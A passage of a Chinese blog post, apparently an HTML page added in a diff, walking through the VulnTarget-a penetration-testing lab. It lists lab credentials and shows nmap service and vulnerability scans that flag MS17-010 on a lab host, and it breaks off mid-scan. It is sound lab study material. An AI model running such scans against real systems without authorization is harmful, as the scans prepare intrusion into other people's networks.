@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/128.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/img/128.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/img/96.ico">
+  <link rel="mask-icon" href="/img/128.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"kpa1on.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一、靶机信息">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnTarget-a 靶场渗透测试">
+<meta property="og:url" content="https://kpa1on.github.io/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="kpa1on&#39;s Blog">
+<meta property="og:description" content="一、靶机信息">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224172048276-1349065730.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180349959-1667979959.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224180450264-1792432834.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224190238933-863110053.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110354482-370777190.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110621623-777957063.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225110725843-1000787767.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111356795-1313355061.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225111701747-1624666354.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225112650421-901340987.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225114131297-1320655720.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132259717-246697551.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132358885-169890561.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132545506-441461470.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132627451-134243051.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132918058-500776476.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225132954621-1024961877.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225133312093-1879231647.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225141445075-1184723408.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145547529-1362028343.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145657518-2077326036.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145724406-1568966848.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145805889-782803992.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225145925039-1401644437.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150027820-1217638930.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150132856-1497488849.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150258857-904011230.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150517118-936221546.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150543950-1336172595.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150618111-137306728.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225150721610-1227593958.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152834006-1262917074.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225152850109-4254443.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225153425556-447460473.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154241871-1129294273.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225154445468-1141645458.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155030667-1311091733.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155107644-2051212924.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220225155139792-2008698039.png">
+<meta property="article:published_time" content="2022-03-10T16:55:32.000Z">
+<meta property="article:modified_time" content="2022-03-15T08:34:12.877Z">
+<meta property="article:author" content="kpa1on">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="vulntarget">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224172048276-1349065730.png">
+
+
+<link rel="canonical" href="https://kpa1on.github.io/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://kpa1on.github.io/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","path":"2022/03/11/VulnTarget-a 靶场渗透测试/","title":"VulnTarget-a 靶场渗透测试"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnTarget-a 靶场渗透测试 | kpa1on's Blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+ 
+<link rel="alternate" href="/atom.xml" title="kpa1on's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">kpa1on's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">keep passion！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">一、靶机信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">二、信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%80%9A%E8%BE%BEOA-Getshell"><span class="nav-number">3.</span> <span class="nav-text">三、通达OA-Getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81ms17-010"><span class="nav-number">4.</span> <span class="nav-text">四、ms17-010</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">五、Redis未授权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81CVE-2020-1472%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">六、CVE-2020-1472提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kpa1on"
+      src="/img/96.ico">
+  <p class="site-author-name" itemprop="name">kpa1on</p>
+  <div class="site-description" itemprop="description">kpa1on的博客</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kpa1on" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kpa1on" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l2kpa1on@gmail.com" title="E-Mail → mailto:l2kpa1on@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wangan.com/docs/javasec" title="https:&#x2F;&#x2F;www.wangan.com&#x2F;docs&#x2F;javasec" rel="noopener" target="_blank">Java安全</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://javasec.org/" title="https:&#x2F;&#x2F;javasec.org&#x2F;" rel="noopener" target="_blank">JavaSec</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/kpa1on" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kpa1on.github.io/2022/03/11/VulnTarget-a%20%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/img/96.ico">
+      <meta itemprop="name" content="kpa1on">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kpa1on's Blog">
+      <meta itemprop="description" content="kpa1on的博客">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulnTarget-a 靶场渗透测试 | kpa1on's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnTarget-a 靶场渗透测试
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-11 00:55:32" itemprop="dateCreated datePublished" datetime="2022-03-11T00:55:32+08:00">2022-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-03-15 16:34:12" itemprop="dateModified" datetime="2022-03-15T16:34:12+08:00">2022-03-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <meta name="referrer" content="no-referrer"/>
+
+<h2 id="一、靶机信息"><a href="#一、靶机信息" class="headerlink" title="一、靶机信息"></a>一、靶机信息</h2><span id="more"></span>
+
+<p>网络拓扑图</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202202/1993367-20220224172048276-1349065730.png" alt="image-20220224172048057"></p>
+<p>攻击机：kali-192.168.12.128</p>
+<p>win7：账号：win7；密码：admin</p>
+<p>win-2016：账号：Administrator；密码：Admin@123</p>
+<p>win-2019:账号：administrator；密码：Admin@666</p>
+<p>靶场下载地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p><code>nmap</code>扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A 192.168.12.136 </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:20 EST</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         nginx</span><br><span class="line">|_http-title: \xCD\xA8\xB4\xEFOA\xCD\xF8\xC2\xE7\xD6\xC7\xC4\xDC\xB0\xEC\xB9\xAB\xCF\xB5\xCD\xB3</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows Vista|2008|7</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7-PC</span><br><span class="line">|   NetBIOS computer name: WIN7-PC\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-02-24T16:20:29+08:00</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: WIN7-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b6:97:9f (VMware)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-02-24T08:20:29</span><br><span class="line">|_  start_date: 2022-02-24T07:19:44</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.77 ms 192.168.12.136</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.05 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据扫描的结果，得知win7开启了SMB服务，可能存在ms1-7010，用nmap进行漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln 192.168.12.136 -p 445,139,135 -T4 -v </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 03:46 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 10.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 03:46, 0.06s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 03:46</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 03:46, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 03:46</span><br><span class="line">Scanning 192.168.12.136 [3 ports]</span><br><span class="line">Discovered open port 139/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 445/tcp on 192.168.12.136</span><br><span class="line">Discovered open port 135/tcp on 192.168.12.136</span><br><span class="line">Completed SYN Stealth Scan at 03:46, 1.14s elapsed (3 total ports)</span><br><span class="line">NSE: Script scanning 192.168.12.136.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 14.99s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Nmap scan report for 192.168.12.136</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:B6:97:9F (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 03:46</span><br><span class="line">Completed NSE at 03:46, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:46</span><br><span 